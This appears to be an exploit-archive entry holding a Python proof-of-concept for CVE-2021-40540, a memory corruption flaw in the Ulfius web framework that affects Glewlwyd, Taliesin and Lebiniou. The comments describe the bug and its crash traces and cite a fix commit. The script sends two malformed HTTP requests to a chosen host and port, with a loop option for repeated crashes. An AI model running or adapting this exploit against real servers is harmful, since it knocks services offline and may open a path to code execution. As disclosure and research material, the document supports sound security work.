@@ -1,0 +1,218 @@
+id: 36754
+date: 09/15/2021
+title: Ulfius Web Framework Remote Memory Corruption Exploit
+author: Jeremy Brown
+cves: CVE-2021-40540
+
+#!/usr/bin/python3
+#
+# guul.py
+#
+# Ulfius Web Framework Remote Memory Corruption Vulnerability
+#
+# Jeremy Brown
+# Sept 2021
+#
+# Intro
+#
+# Ulfius Web Framework is used by a number of different projects to build web services. Some of the projects
+# tested and confirmed vulnerable are Glewlwyd SSO Server, Taliesin Audio Streaming Service and Lebiniou Music
+# Visualization Suite (web UI).
+#
+# When parsing malformed HTTP requests, a heap-related initialization bug is triggered resulting in a crash in the
+# server or potentially remote code execution with privileges of the running process. The affected process crashes
+# with either a SIGSEGV or SIGARBT + "double free" error. This repro doesn't consistently trigger the latter condition
+# though and it may take many tries / variations eg. looping a target package so it restarts on crashes and looping
+# it to send many payloads or just fuzzing the crashing requests to get it in the right state.
+#
+# CVE-2021-40540
+#
+# Demo
+#
+# $ ./guul.py 10.0.0.2 --loop
+#
+# $ while :; do glewlwyd 2>&1 > /dev/null; done
+# ....
+# Segmentation fault (core dumped)
+# Segmentation fault (core dumped)
+# Segmentation fault (core dumped)
+# double free or corruption (out)
+# Aborted (core dumped)
+#
+# Debugger
+#
+# double free or corruption (out)
+# Thread 183 "MHD-connection" received signal SIGABRT, Aborted.
+#
+# (gdb) bt
+# 0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
+# 1  0x00007ffff7afb859 in __GI_abort () at abort.c:79
+# 2  0x00007ffff7b663ee in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7c90285 "%s\n")
+    # at ../sysdeps/posix/libc_fatal.c:155
+# 3  0x00007ffff7b6e47c in malloc_printerr (str=str@entry=0x7ffff7c92670 "double free or corruption (out)") at malloc.c:5347
+# 4  0x00007ffff7b70120 in _int_free (av=0x7ffff7cc1b80 <main_arena>, p=0x7fffe8000090, have_lock=<optimized out>) at malloc.c:4314
+# 5  0x00007ffff766b035 in ?? () from /lib/x86_64-linux-gnu/libmicrohttpd.so.12
+# 6  0x00007ffff766bed8 in MHD_destroy_post_processor () from /lib/x86_64-linux-gnu/libmicrohttpd.so.12
+# 7  0x00007ffff7cf14f7 in mhd_request_completed () from /usr/local/lib/libulfius.so.2.7
+# 8  0x00007ffff765c670 in ?? () from /lib/x86_64-linux-gnu/libmicrohttpd.so.12
+# 9  0x00007ffff76608d6 in ?? () from /lib/x86_64-linux-gnu/libmicrohttpd.so.12
+# 10 0x00007ffff7664069 in ?? () from /lib/x86_64-linux-gnu/libmicrohttpd.so.12
+# 11 0x00007ffff7f57609 in start_thread (arg=<optimized out>) at pthread_create.c:477
+# 12 0x00007ffff7bf8293 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
+#
+# Fix
+# - commit c83f564c184a27145e07c274b305cabe943bbfaa
+#
+
+import os
+import sys
+import argparse
+import random
+import time
+import signal
+import socket
+
+#
+# confirmed affected packages
+#
+GLEWLWYD_PORT = 4593 # glewlwyd
+LEBINIOU_PORT = 30543 # apt install lebiniou
+TALIESIN_PORT = 8576 # docker run --rm -it -p 8576:8576 -v /tmp/taliesin:/var/cache/taliesin babelouest/taliesin_x86_64_sqlite_noauth_quickstart
+
+#
+# simple requests, but wasn't obvious during fuzzing that it takes two of them to trigger the crash
+#
+REQ_1 = b'POST / HTTP/1.1\r\rx'
+REQ_2 = b'GET / HTTP/1.1\r\r'
+
+class Guul(object):
+    def __init__(self, args):
+        self.host = args.host
+        self.port = args.port
+        self.loop = args.loop
+
+        self.sock = None
+
+    def run(self):
+        if(self.loop):
+            print("sending requests to trigger crash, hit ctrl+c to stop\n")
+
+            while(True):
+                if(self.triggerCrash() < 0):
+                    return -1
+        else:
+            print("sending requests to trigger crash\n")
+
+            if(self.triggerCrash() < 0):
+                return -1
+
+        print("done\n")
+
+        return 0
+
+    def getSock(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+        except Exception as error:
+            print("socket() failed: %s\n" % error)
+            return None
+
+        return sock
+
+    def connect(self):
+        self.sock = self.getSock()
+
+        if(self.sock == None):
+            return -1
+
+        try:
+            self.sock.connect((self.host, self.port))
+        except Exception as error:
+            print("connect() failed: %s\n" % error)
+            return -1
+
+        return 0
+
+    def prepNext(self, host):
+        self.sock.close()
+
+        time.sleep(2)
+
+        if(self.connect() < 0):
+            print("connection failed\n")
+            return -1
+
+    def sendReq(self, num, req):
+        try:
+            self.sock.send(req)
+        except Exception as error:
+            print("failed to send request %d: %s\n" % (num, error))
+            return -1
+
+        try:
+            self.sock.recv(1024)
+        except Exception as error:
+            pass # expected as target may stop responding after requests
+
+        return 0
+
+    def triggerCrash(self):
+        if(self.connect() < 0):
+            print("connection failed\n")
+            return -1
+
+        if(self.sendReq(1, REQ_1) < 0):
+            return -1
+
+        self.prepNext(self.host)
+
+        if(self.sendReq(2, REQ_2) < 0):
+            return -1
+
+        self.sock.close()
+
+        return 0
+
+def stop(signum, frame):
+    print("\n\ndone\n")
+    sys.exit(0)
+
+def arg_parse():
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("host",
+                        type=str,
+                        help="target ip")
+
+    parser.add_argument("-p",
+                        "--port",
+                        type=int,
+                        default=GLEWLWYD_PORT,
+                        help="target port (default: %d)" % GLEWLWYD_PORT)
+
+    parser.add_argument("-l",
+                        "--loop",
+                        default=False,
+                        action="store_true",
+                        help="loop sending the crashing requests for testing")
+
+    args = parser.parse_args()
+
+    return args
+
+def main():
+    signal.signal(signal.SIGINT, stop)
+
+    args = arg_parse()
+
+    gg = Guul(args)
+    result = gg.run()
+
+    if(result > 0):
+        sys.exit(-1)
+
+if(__name__ == '__main__'):
+    main()
+
+#  0day.today [2023-03-22]  #
